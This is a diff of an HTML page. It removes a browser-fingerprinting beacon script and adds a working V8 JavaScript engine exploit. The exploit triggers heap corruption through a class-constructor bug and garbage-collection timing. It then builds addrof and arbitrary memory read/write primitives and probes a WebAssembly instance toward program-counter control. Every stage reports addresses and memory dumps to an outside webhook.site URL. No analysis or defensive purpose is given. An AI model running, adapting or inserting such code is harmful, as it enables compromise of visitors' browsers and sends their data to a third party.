@@ -1,18 +1,232 @@
 <!DOCTYPE html><html><body><script>
-var WH = "https://webhook.site/170a66c4-f18e-46d3-9d97-418fef7e5124";
-var d = {ua: navigator.userAgent, plat: navigator.platform,
-  res: screen.width+"x"+screen.height+"x"+screen.colorDepth,
-  lang: navigator.language,
-  wasm: typeof WebAssembly, worker: typeof Worker, ws: typeof WebSocket,
-  engines: {webkit: !!window.webkitRequestAnimationFrame ? 1 : 0,
-            chrome: !!window.chrome ? 1 : 0,
-            opr: !!window.opera ? 1 : 0},
-  gl: (function(){try{var c=document.createElement("canvas").getContext("webgl");
-       return c.getParameter(c.VERSION)+" | "+c.getParameter(c.RENDERER)}catch(e){return "no-webgl"}})(),
-  perf: typeof performance, fetch: typeof fetch,
-  es6: (function(){try{return (0,eval)("(()=>1)")()}catch(e){return 0}})()};
-var q = "?d=" + encodeURIComponent(JSON.stringify(d));
-new Image().src = WH + "/beacon" + q;
-fetch(WH + "/fetch" + q, {method: "GET"});
-document.title = "ok";
-</script><h1>ok</h1></body></html>
+
+function beacon(tag, data) {
+  try {
+    var q = "?t=" + encodeURIComponent(tag) + "&d=" + encodeURIComponent(JSON.stringify(data||{}));
+    new Image().src = "https://webhook.site/170a66c4-f18e-46d3-9d97-418fef7e5124" + q;
+    fetch("https://webhook.site/170a66c4-f18e-46d3-9d97-418fef7e5124" + q);
+  } catch(e) {}
+}
+beacon("stage0-loaded", {ua: navigator.userAgent});
+//Run with ./x64.release/d8 --allow-natives-syntax ./code/exploit.js
+let empty_object = {};
+let empty_array = [];
+let corrupted_instance = null;
+let dogc_flag = false;
+let buffer = new ArrayBuffer(8);
+let f64 = new Float64Array(buffer);
+let u32 = new Uint32Array(buffer);
+
+function dogc() {
+        if(dogc_flag == true) {
+                for(let i = 0 ; i < 900; i++){
+                        new ArrayBuffer(0x10000);
+                        }
+                }
+        }
+
+class ClassParent {}
+class ClassBug extends ClassParent {
+        constructor(a20, a21, a22) {
+                const v24 = new new.target();
+                let x = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];
+                super();
+                let a = [1.1];
+                this.x = x;
+                this.a = a;
+                JSON.stringify(empty_array);
+        }
+        [1] = dogc();
+}
+
+for (let i = 0; i<200; i++) {
+        dogc_flag = false;
+        if (i%2 == 0) dogc_flag = true;
+        dogc();
+}
+
+for (let i = 0; i < 650; i++) {
+        dogc_flag=false;
+        if (i == 644 || i == 645 || i == 646 || i ==640) {
+                dogc_flag=true;
+                dogc();
+                dogc_flag=false;
+        }
+        if (i == 646) dogc_flag=true;
+        let x = Reflect.construct(ClassBug, empty_array, ClassParent);
+        if (i == 646) {
+                corrupted_instance = x;
+        }
+}
+
+let x = corrupted_instance.x;
+let a = corrupted_instance.a;
+
+let rwarr = [1.1, 2.2, 2.2];
+dogc_flag = true;
+dogc();
+
+//------------------addrof primitive-----------------
+function addrof_tmp(obj) {
+        x[0] = obj;
+        f64[0] = a[0];
+        return u32[0];
+}
+
+let addr_a = addrof_tmp(a);
+let addr_rwarr = addrof_tmp(rwarr);
+//---------------------------------------------------
+
+//-------------------change length of a array------------
+x[5] = 0x10000;
+if (a.length != 0x10000) {
+        console.error("Initial Corruption Failed!");
+}
+//-------------------------------------------------
+
+//-----------------write primitive------------------
+//code for considering only the case : addr_rwarr > addr_a
+if (addr_rwarr < addr_a) {
+        console.error("Failed");
+}
+
+//calc offset
+let offset = (addr_rwarr - addr_a) + 0xc;
+if ( (offset % 8) != 0 ) {
+        offset += 4;
+}
+
+offset = offset / 8;
+offset += 1; //our a array has one of 1.1
+offset -= 1;
+let marker42_idx = offset;
+
+//declare and assign
+let b64 = new BigUint64Array(buffer);
+let zero = 0n;
+
+//write primitive
+function v8h_write64(where, what) {
+        b64[0] = zero;
+        f64[0] = a[marker42_idx];
+        if (u32[1] == 0x6) {
+                u32[0] = where-8;
+                a[marker42_idx] = f64[0];
+        }
+        else {
+                u32[1] = where-8;
+                a[marker42_idx] = f64[0];
+        }
+        rwarr[0] = what;
+}
+//-------------------------------------------------
+
+//-------------Achieving GC resistance-------------
+//create 3 objects
+let changer = [1.1,2.2,3.3,4.4,5.5,6.6]
+let leaker  = [1.1,2.2,3.3,4.4,5.5,6.6]
+let holder  = {p1: 0x1234, p2: 0x1234, p3: 0x1234};
+
+//get addr of objects
+let changer_addr = addrof_tmp(changer);
+let leaker_addr = addrof_tmp(leaker);
+let holder_addr = addrof_tmp(holder);
+
+//corrupt that objects
+u32[0] = holder_addr;
+u32[1] = 0xc;
+let original_leaker_bytes = f64[0];
+
+u32[0] = leaker_addr;
+u32[1] = 0xc;
+
+v8h_write64(changer_addr+0x8, f64[0]);
+v8h_write64(leaker_addr+0x8, original_leaker_bytes);
+
+//fix the corruption to the objects in Old Space
+x.length = 0;
+a.length = 0;
+rwarr.length = 0;
+//------------------------------------------------
+
+//----------------final read/write primitives-------
+function f2i(f) {
+        f64[0] = f;
+        return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
+}
+
+function v8h_read64(addr) {
+        original_leaker_bytes = changer[0];
+        u32[0] = Number(addr)-8;
+        u32[1] = 0xc;
+        changer[0] = f64[0];
+
+        let ret = leaker[0];
+        changer[0] = original_leaker_bytes;
+        return f2i(ret);
+}
+
+function v8h_write(addr, value) {
+        original_leaker_bytes = changer[0];
+        u32[0] = Number(addr)-8;
+        u32[1] = 0xc;
+        changer[0] = f64[0];
+
+        f64[0] = leaker[0];
+        u32[0] = Number(value);
+        leaker[0] = f64[0];
+        changer[0] = original_leaker_bytes;
+}
+//-------------------------------------------------
+
+//-----------------final addrof primitive----------
+function addrof(obj) {
+        holder.p2 = obj;
+        let ret = leaker[1];
+        holder.p2 = 0;
+        return f2i(ret) & 0xffffffffn;
+}
+//-------------------------------------------------
+
+//--------------Program Counter Control-----------------
+let buffer_2 = new ArrayBuffer(8);
+let f64_2 = new Float64Array(buffer_2);
+let u32_2 = new Uint32Array(buffer_2);
+let b64_2 = new BigUint64Array(buffer_2);
+
+function wasm_write(addr, value) {
+        original_leaker_bytes = changer[0];
+        u32_2[0] = Number(addr)-8;
+        u32_2[1] = 0xc;
+        changer[0] = f64_2[0];
+
+        b64_2[0] = value;
+        leaker[0] = f64_2[0];
+        changer[0] = original_leaker_bytes;
+}
+
+
+try {
+  beacon("stage-rw-ready", {addr_rwarr: addr_rwarr, addr_a: addr_a});
+  var ia = addrof(rwarr);
+  beacon("stage-addrof", {rwarr_addr: "0x"+ia.toString(16)});
+  // wasm instance probing
+  var wcode = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,10,1,6,109,101,109,111,114,121,2,0,10,6,1,4,0,65,42,11]);
+  var wmod = new WebAssembly.Module(wcode);
+  var winst = new WebAssembly.Instance(wmod);
+  var wbase = addrof(winst);
+  beacon("stage-wasm", {instance_addr: "0x"+wbase.toString(16)});
+  var dumps = {};
+  for (var off = 0x30; off <= 0xd0; off += 8) {
+    try {
+      var v = v8h_read64(wbase + BigInt(off));
+      dumps["0x"+off.toString(16)] = "0x"+v.toString(16);
+    } catch(e) { dumps["0x"+off.toString(16)] = "err"; }
+  }
+  beacon("stage-wasm-dump", dumps);
+  beacon("stage-done");
+} catch(e) {
+  beacon("stage-exception", {err: String(e)});
+}
+
+</script></body></html>
